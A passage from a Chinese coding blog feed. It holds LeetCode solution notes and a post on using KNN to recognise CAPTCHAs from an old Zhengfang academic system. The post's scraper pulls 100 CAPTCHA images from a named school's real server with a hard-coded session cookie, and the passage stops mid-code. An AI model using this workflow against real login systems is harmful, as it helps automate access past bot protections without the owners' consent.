href="https://leetcode-cn.com/problems/permutations/" target="_blank" rel="noopener">46. 全排列</a></p><h3 id="很喜欢的解法-1"><a href="#很喜欢的解法-1" class="headerlink" title="很喜欢的解法"></a>很喜欢的解法</h3><p><a href="https://docs.python.org/3/library/itertools.html#module-itertools" title="Permalink to this headline" target="_blank" rel="noopener">itertools — Functions creating iterators for efficient looping</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        <span class="keyword">return</span> list(itertools.permutations(nums))</span><br></pre></td></tr></table></figure></p><h3 id="参考了题解的解法"><a href="#参考了题解的解法" class="headerlink" title="参考了题解的解法"></a>参考了题解的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#回溯算法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        result=[]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">backtracks</span><span class="params">(nums,tmp)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">                result.append(tmp)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                backtracks(nums[:i]+nums[i+<span class="number">1</span>:],tmp+[nums[i]])</span><br><span class="line">        backtracks(nums,[])</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h3 id="感想-9"><a href="#感想-9" class="headerlink" title="感想"></a>感想</h3><ul><li>值得参考的题解：<a href="https://leetcode-cn.com/problems/permutations/solution/hui-su-suan-fa-python-dai-ma-java-dai-ma-by-liweiw/" target="_blank" rel="noopener">从全排列问题开始理解「回溯」算法（深度优先遍历 + 状态重置 + 剪枝）</a></li><li>多读文档多动脑，停止暴力（。</li></ul><h3 id="题目链接-10"><a href="#题目链接-10" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/zigzag-conversion/" target="_blank" rel="noopener">6. Z 字形变换</a></p><h3 id="很喜欢的解法-2"><a href="#很喜欢的解法-2" class="headerlink" title="很喜欢的解法"></a>很喜欢的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(self, s: str, numRows: int)</span> -&gt; str:</span></span><br><span class="line">        tmp=[<span class="string">''</span>]*len(s)</span><br><span class="line">        start,flag=<span class="number">0</span>,<span class="number">-1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            tmp[start]+=i</span><br><span class="line">            <span class="keyword">if</span> start==<span class="number">0</span> <span class="keyword">or</span> start==numRows<span class="number">-1</span>:flag=-flag</span><br><span class="line">            start+=flag</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(tmp)</span><br></pre></td></tr></table></figure><h3 id="自己第一反应的解法-5"><a href="#自己第一反应的解法-5" class="headerlink" title="自己第一反应的解法"></a>自己第一反应的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(self, s: str, numRows: int)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">if</span> numRows==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        s=list(s)</span><br><span class="line">        jump=numRows*<span class="number">2</span><span class="number">-2</span></span><br><span class="line">        tmp=s[::jump]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,numRows<span class="number">-1</span>):</span><br><span class="line">            tmp+=[k <span class="keyword">for</span> j <span class="keyword">in</span> zip_longest(s[i::jump],s[jump-i::jump],fillvalue=<span class="string">''</span>) <span class="keyword">for</span> k <span class="keyword">in</span> j]</span><br><span class="line">        tmp+=s[numRows<span class="number">-1</span>::jump]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(tmp)</span><br></pre></td></tr></table></figure><h3 id="感想-10"><a href="#感想-10" class="headerlink" title="感想"></a>感想</h3><ul><li>多动脑*2。天才 改索引方向 天才</li></ul><h2 id="4-28"><a href="#4-28" class="headerlink" title="4.28"></a>4.28</h2><h3 id="题目链接-11"><a href="#题目链接-11" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/" target="_blank" rel="noopener">面试题56 - I. 数组中数字出现的次数</a></p><blockquote><p>一个整型数组 nums 里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。</p></blockquote><h3 id="很喜欢的解法（位运算）"><a href="#很喜欢的解法（位运算）" class="headerlink" title="很喜欢的解法（位运算）"></a>很喜欢的解法（位运算）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumbers</span><span class="params">(self, nums: List[int])</span> -&gt; List[int]:</span></span><br><span class="line">        tmp=reduce(<span class="keyword">lambda</span> x,y:x^y,nums)</span><br><span class="line">        lowbit=tmp&amp;(-tmp)</span><br><span class="line">        result=[<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i]&amp;lowbit==<span class="number">0</span>:</span><br><span class="line">                result[<span class="number">0</span>]^=nums[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result[<span class="number">1</span>]^=nums[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h3 id="解法说明"><a href="#解法说明" class="headerlink" title="解法说明"></a>解法说明</h3><ul><li>参考题解：<a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/solution/wei-yun-suan-san-bu-zou-by-jerry_nju/" target="_blank" rel="noopener">位运算三步走 详细解释lowbit原理</a></li><li>因为“其他数字都出现了两次”，而相同值的异或结果为0，所以对所有数做异或的结果必定是“只出现一次的某两个数异或的结果”，暂称a和b。</li><li>之后只要找到a和b（任意一个）不同的一位（即上一步的异或结果为1），就可以通过这一位把a和b区分开。为方便起见，解法里通过<code>lowbit=tmp&amp;-tmp</code>获取最低位的<code>1</code>，并把这一位外的数都置0，作为掩码（mask）。</li><li>这样一来，和<code>mask</code>做与运算的结果必定是<code>0</code>（在那一位上为0）或<code>mask</code>（在那一位上为1）。最后只需要挨个遍历，通过与运算区分开a和b以后再做异或就ok，出现两次的会自己消掉，所以剩下的就是所求的a和b。</li></ul><h2 id="4-29"><a href="#4-29" class="headerlink" title="4.29"></a>4.29</h2><h3 id="题目链接-12"><a href="#题目链接-12" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/find-in-mountain-array/" target="_blank" rel="noopener">1095. 山脉数组中查找目标值</a></p><h3 id="很喜欢的解法（二分查找）"><a href="#很喜欢的解法（二分查找）" class="headerlink" title="很喜欢的解法（二分查找）"></a>很喜欢的解法（二分查找）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(mountain, target, l, r, key=lambda x: x)</span>:</span></span><br><span class="line">    target = key(target)</span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        cur = key(mountain.get(mid))</span><br><span class="line">        <span class="keyword">if</span> cur == target:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> cur &lt; target:</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findInMountainArray</span><span class="params">(self, target: int, mountain_arr: <span class="string">'MountainArray'</span>)</span> -&gt; int:</span></span><br><span class="line">        l, r = <span class="number">0</span>, mountain_arr.length() - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            mid = (l + r) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mountain_arr.get(mid) &lt; mountain_arr.get(mid + <span class="number">1</span>):</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid</span><br><span class="line">        peak = l</span><br><span class="line">        index = binary_search(mountain_arr, target, <span class="number">0</span>, peak)</span><br><span class="line">        <span class="keyword">if</span> index != <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> index</span><br><span class="line">        index = binary_search(mountain_arr, target, peak + <span class="number">1</span>, mountain_arr.length() - <span class="number">1</span>, <span class="keyword">lambda</span> x: -x)</span><br><span class="line">        <span class="keyword">return</span> index</span><br></pre></td></tr></table></figure><h3 id="感想-11"><a href="#感想-11" class="headerlink" title="感想"></a>感想</h3><ul><li>参考题解：<a href="https://leetcode-cn.com/problems/find-in-mountain-array/solution/shan-mai-shu-zu-zhong-cha-zhao-mu-biao-zhi-by-leet/" target="_blank" rel="noopener">山脉数组中查找目标值</a></li><li>这一手lambda用得好强，二分的泛用性也好强，学习了（。</li></ul><h2 id="4-30"><a href="#4-30" class="headerlink" title="4.30"></a>4.30</h2><h3 id="题目链接-13"><a href="#题目链接-13" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/happy-number/" target="_blank" rel="noopener">202. 快乐数</a></p><h3 id="很喜欢的解法（快慢指针）"><a href="#很喜欢的解法（快慢指针）" class="headerlink" title="很喜欢的解法（快慢指针）"></a>很喜欢的解法（快慢指针）</h3><blockquote><p>参考英文网站热评第一。这题可以用快慢指针的思想去做，有点类似于检测是否为环形链表那道题。<br>如果给定的数字最后会一直循环重复，那么快的指针（值）一定会追上慢的指针（值），也就是两者一定会相等。如果没有循环重复，那么最后快慢指针也会相等，且都等于1。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isHappy</span><span class="params">(self, n: int)</span> -&gt; bool:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(i)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> sum(map(<span class="keyword">lambda</span> x:int(x)**<span class="number">2</span>,list(str(i))))</span><br><span class="line">        slow=calc(n)</span><br><span class="line">        fast=calc(calc(n))</span><br><span class="line">        <span class="keyword">while</span> slow!=fast <span class="keyword">and</span> fast!=<span class="number">1</span>:</span><br><span class="line">            slow=calc(slow)</span><br><span class="line">            fast=calc(calc(fast))</span><br><span class="line">        <span class="keyword">return</span> fast==<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="看了题解的解法（HashSet）"><a href="#看了题解的解法（HashSet）" class="headerlink" title="看了题解的解法（HashSet）"></a>看了题解的解法（HashSet）</h3><blockquote><p>我们使用 HashSet 而不是向量、列表或数组的原因是因为我们反复检查其中是否存在某数字。检查数字是否在哈希集中需要O(1)的时间，而对于其他数据结构，则需要O(n)的时间。选择正确的数据结构是解决这些问题的关键部分。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isHappy</span><span class="params">(self, n: int)</span> -&gt; bool:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(i)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> sum(map(<span class="keyword">lambda</span> x:int(x)**<span class="number">2</span>,list(str(n))))</span><br><span class="line">        tmp=set()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            n=calc(n)</span><br><span class="line">            print(n)</span><br><span class="line">            <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> n <span class="keyword">not</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                tmp.add(n)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="感想-12"><a href="#感想-12" class="headerlink" title="感想"></a>感想</h3><blockquote><p>此题不建议用集合记录每次的计算结果来判断是否进入循环，因为这个集合可能大到无法存储；另外，也不建议使用递归，同理，如果递归层次较深，会直接导致调用栈崩溃。不要因为这个题目给出的整数是int型而投机取巧。</p></blockquote><ul><li>菜 我 菜。这道题最大也就243所以不会崩，但是其他场景下就不好说了，所以还是用快慢指针好一点。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BFS </tag>
            
            <tag> 贪心 </tag>
            
            <tag> 双指针 </tag>
            
            <tag> 回溯 </tag>
            
            <tag> 位运算 </tag>
            
            <tag> 二分查找 </tag>
            
            <tag> HashSet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KNN的python实现&amp;简单应用</title>
      <link href="/2019/05/21/KNN%E7%9A%84python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2019/05/21/KNN%E7%9A%84python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>闲着无聊的摸鱼<br><a id="more"></a></excerpt></p><the rest of contents | 余下全文><p>步了学长的老路，准备搞一下旧版正方的图片验证码（。<br>当然这篇重点是堆一下KNN，真要想做识别的话搞这个基础算法没前途的<del>而且也没准确率</del>，卷积神经网络使我快乐（……<br>附学长文章链接：<a href="https://www.jianshu.com/p/65536bcd3590" target="_blank" rel="noopener">实战“正方教务管理系统”验证码识别</a></p><p>整体思路是<code>手动标记内容-&gt;二值化-&gt;分割图片并按照图像内容分类-&gt;测试数据</code>这样子。</p><p>用了真实数据集<del>甚至图像还没去噪</del>，领会精神就好（。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>随便挑一个旧版正方教务系统，拿到生成验证码图像的网页。这里随便找了个<del>没做频繁访问处理的</del>学校的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">121.22.25.47/CheckCode.aspx</span><br></pre></td></tr></table></figure></p><p>抓包写headers的过程不再赘述。构造爬虫脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●getPIC v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">作者：Yemu</span></span><br><span class="line"><span class="string">创建日期：19.5.21</span></span><br><span class="line"><span class="string">最近修改时间：19.5.21</span></span><br><span class="line"><span class="string">程序目的：爬取教务系统验证码图片</span></span><br><span class="line"><span class="string">程序备注：</span></span><br><span class="line"><span class="string">        1.用于爬取KNN算法中所需的原始数据集</span></span><br><span class="line"><span class="string">        2.因为可复用性为零所以直接莽了，没封装函数啥的，问题不大</span></span><br><span class="line"><span class="string">关于作者栏的署名：</span></span><br><span class="line"><span class="string">        复用性极低的辣鸡程序=Yemu</span></span><br><span class="line"><span class="string">        带有探索和尝试性质=Kadoya</span></span><br><span class="line"><span class="string">        不知道写哪个id好的时候=ylylhl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path=<span class="string">'./origin/'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(path)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"dir has been exist."</span>)</span><br><span class="line">    </span><br><span class="line">url=<span class="string">"http://121.22.25.47/CheckCode.aspx"</span></span><br><span class="line">cookie=<span class="string">"ASP.NET_SessionId=sgoze555qu3hqef42kchnm55"</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">"Host"</span>: <span class="string">"121.22.25.47"</span>,</span><br><span class="line">            <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">            <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">            <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">            <span class="string">"Proxy-Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">            <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">            <span class="string">"Referer"</span>: <span class="string">"http://121.22.25.47/"</span>,</span><br><span class="line">            <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span><br><span class="line">            &#125;</span><br><span class="line">        response = requests.get(url,headers=headers)</span><br><span class="line">        filename=path+str(n)+<span class="string">'.gif'</span></span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'error:'</span>,e)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">print(<span class="string">'done'</span>)</span><br></pre></td></tr></table></figure></p><p>如下图，然后就到了令人去世的手动改名时间（。</p><p><img src="/2019/05/21/KNN的python实现/10480445-03691f5378291c7f.png" alt></p><p>二值化&amp;分割图片脚本如下，分割区域直接搬了学长的数据（靠）<br>可以用opencv或者别的什么降噪，也可以做旋转处理，然懒（<br>或者直接指定rgb手动二值化，同样可以达到降噪的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●splitPIC v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">作者：Yemu</span></span><br><span class="line"><span class="string">创建日期：19.5.21</span></span><br><span class="line"><span class="string">最近修改时间：19.5.21</span></span><br><span class="line"><span class="string">程序目的：二值化+分割图片为单个字符+获取特征值并写入文件（=分类好的数据集</span></span><br><span class="line"><span class="string">程序备注：</span></span><br><span class="line"><span class="string">        1.get_feature函数是抄来的（安详</span></span><br><span class="line"><span class="string">          参考链接：https://www.cnblogs.com/beer/p/5672678.html</span></span><br><span class="line"><span class="string">        2.懒得做去噪处理了，做了的话KNN正确率会更高一点</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_feature</span><span class="params">(img)</span>:</span>   <span class="comment">#获取指定图片特征值，即数每行每列黑色像素点</span></span><br><span class="line">    width, height = img.size</span><br><span class="line">    pixel_cnt_list = []</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">        pix_cnt_x = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">            <span class="keyword">if</span> img.getpixel((x, y)) == <span class="number">0</span>:  <span class="comment">#黑色点</span></span><br><span class="line">                pix_cnt_x += <span class="number">1</span></span><br><span class="line">        pixel_cnt_list.append(pix_cnt_x)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">        pix_cnt_y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">            <span class="keyword">if</span> img.getpixel((x, y)) == <span class="number">0</span>:  <span class="comment">#黑色点</span></span><br><span class="line">                pix_cnt_y += <span class="number">1</span></span><br><span class="line">        pixel_cnt_list.append(pix_cnt_y)</span><br><span class="line">    <span class="keyword">return</span> pixel_cnt_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    path=<span class="string">'./origin/'</span></span><br><span class="line">    filelist=[path+i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(path)]</span><br><span class="line">    d=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> filelist:</span><br><span class="line">        img=Image.open(i)</span><br><span class="line">        img=img.convert(<span class="string">'L'</span>).convert(<span class="string">'1'</span>)</span><br><span class="line">        boxs = [(<span class="number">5</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">21</span>), (<span class="number">17</span>, <span class="number">1</span>, <span class="number">29</span>, <span class="number">21</span>), (<span class="number">29</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">21</span>), (<span class="number">41</span>, <span class="number">1</span>, <span class="number">53</span>, <span class="number">21</span>)]</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(len(boxs)):</span><br><span class="line">            roi = img.crop(boxs[x])</span><br><span class="line">            d.setdefault(i[len(path):][x], [])</span><br><span class="line">            d[i[len(path):][x]].append(roi)</span><br><span class="line"></span><br><span class="line">    f=open(<span class="string">'data.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d.keys():</span><br><span class="line">        <span class="comment">#new_path='./data2/'+i+'/'</span></span><br><span class="line">        <span class="comment">#os.makedirs(new_path)</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(d[i])):</span><br><span class="line">            <span class="comment">#filename=new_path+str(j)+'.png'</span></span><br><span class="line">            <span class="comment">#d[i][j].save(filename)</span></span><br><span class="line">            s=i+<span class="string">' '</span>+<span class="string">' '</span>.join(str(i) <span class="keyword">for</span> i <span class="keyword">in</span> get_feature(d[i][j]))+<span class="string">'\n'</span></span><br><span class="line">            <span class="comment">#格式：对应字符+图像特征值</span></span><br><span class="line">            f.write(s)</span><br></pre></td></tr></table></figure><p>这时生成的数据集如下图，前期准备已经完成。</p><p><img src="/2019/05/21/KNN的python实现/10480445-d9f5e959b6e0d46e.png" alt></p><h2 id="kNN算法"><a href="#kNN算法" class="headerlink" title="kNN算法"></a>kNN算法</h2><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>kNN算法的核心思想是如果一个样本在特征空间中的k个最相邻的样本中的大多数属于某一个类别，则该样本也属于这个类别。</p><p>不得不说，百科上这张图挺好的，借用一下：</p><p><img src="/2019/05/21/KNN的python实现/10480445-f34cadc08a646faa.png" alt></p><p>实现起来也很简单 <del>比k-means还要简单</del>，只需计算测试向量距每个点的欧氏距离即可。相对的缺点也很明显，（因为每个点都要算一遍所以）数据集大的时候算起来真的很慢（。<br>区别的话kmeans是聚类而knn则是分类，关于它们区别的详细说明推荐阅读这篇文章：<a href="https://www.cnblogs.com/peizhe123/p/4619066.html" target="_blank" rel="noopener">Kmeans算法与KNN算法的区别</a></p><h3 id="python实现"><a href="#python实现" class="headerlink" title="python实现"></a>python实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 